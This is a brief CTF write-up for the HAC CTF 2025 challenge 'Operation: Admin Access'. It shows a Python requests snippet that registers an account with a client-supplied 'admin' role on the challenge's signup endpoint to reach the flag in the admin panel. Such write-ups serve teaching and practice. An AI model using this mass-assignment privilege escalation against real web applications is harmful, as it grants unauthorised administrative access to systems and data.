---
title: HAC CTF 2025 Operation Admin Access
draft: false
tags:
  - ctf
  - web-exploitation
---
## Operation: Admin Access

> SpyLog's covert communication system has a strict hierarchy. Only field agents with admin clearance can access certain intel. We've stored a critical access code in the admin account that only authorized high-level operatives can view. Can you find a way to escalate your privileges and retrieve the classified information? 

Similarly to Loose Lips, we can just create an arbitrary account with the `admin` role!

```python
BASE_URL = 'https://spylog.chals.ctf.malteksolutions.com'

# Register as admin
r = requests.post(BASE_URL + '/signup', json = {
    'email': 'test100@test.com',
    'password': 'test',
    'first_name': 'test',
    'last_name': 'test',
    'role': 'admin'
})
```

Then, we can login on the actual web app using the credentials, and access the admin panel which has the flag!